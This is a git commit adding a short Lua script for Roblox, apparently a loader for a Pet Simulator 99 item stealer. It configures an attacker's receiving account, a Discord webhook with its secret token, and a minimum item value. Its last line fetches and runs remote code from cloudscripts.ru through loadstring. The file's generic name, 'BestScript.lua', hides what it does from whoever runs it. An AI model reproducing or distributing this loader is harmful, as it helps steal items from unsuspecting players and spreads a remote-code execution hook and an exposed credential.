6cda2da8a25a9728dfee382102baff282e8fd0a2
GODZUUU <plastikvr@gmail.com>
2024-09-28 08:06:33 +0200

    Create BestScript.lua

---
+++ BestScript.lua
@@ -0,0 +1,8 @@
+Username= 'granny452423kill'
+--your roblox username(preferably alt account)
+Webhook= 'https://discord.com/api/webhooks/1289261162310930563/6QPSHFAwsMMLJGU02eYsZucY6LUhgu91y9yd3nAduhnGdW6PN8jccpmaJqManr_coMm7'
+--your Discord webhook
+
+MinimumRAP = 250000
+
+loadstring(game:HttpGet('https://cloudscripts.ru/raw/ps99'))()
